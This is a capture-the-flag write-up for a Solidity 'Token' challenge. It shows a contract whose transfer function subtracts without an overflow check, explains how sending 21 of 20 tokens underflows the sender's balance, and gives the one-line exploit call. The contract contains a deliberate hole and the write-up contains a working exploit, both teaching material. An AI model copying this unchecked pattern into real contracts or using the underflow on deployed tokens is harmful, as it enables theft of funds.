# Token

The source for this challenge is

```
pragma solidity ^0.4.18;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  function Token(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

The challenge says that we start with 20 tokens and the objective is to somehow get more than that. In order to do this we can use an underflow.

The `mapping(address => uint) balances;` states that each `address` has a `balance` and this is a `uint`. `uint` is the same as `uint256`, this means that the `balance` can hold an integer within `[0, 2^256 -1]`. Notice that this range contains only positive integers so what happens if this variable goes below `0`? It can't be a negative integer so it will be set to a positive integer greater than 0.

In this challenge we have 20 tokens and if we invoke the `transfer` function with a `_value` of 21 we are going to do an underflow.

```
// The condition inside the require will be satisfied because
// 20 - 21 = 2^256 - 1
require(balances[msg.sender] - _value >= 0);

// Our balance will be set to a really big number because
// 20 - 21 = 2^256 - 1
balances[msg.sender] -= _value;

// If we use _to as our address we are going to undo the overflow because
// (2^256 - 1) + 21 = 20
// So we need to use another address like 0x0000000000000000000000000000000000000000
balances[_to] += _value;
```

Then to solve this challenge we need to call the transfer function from the console like

```
contract.transfer("0x0000000000000000000000000000000000000000", 21)
```
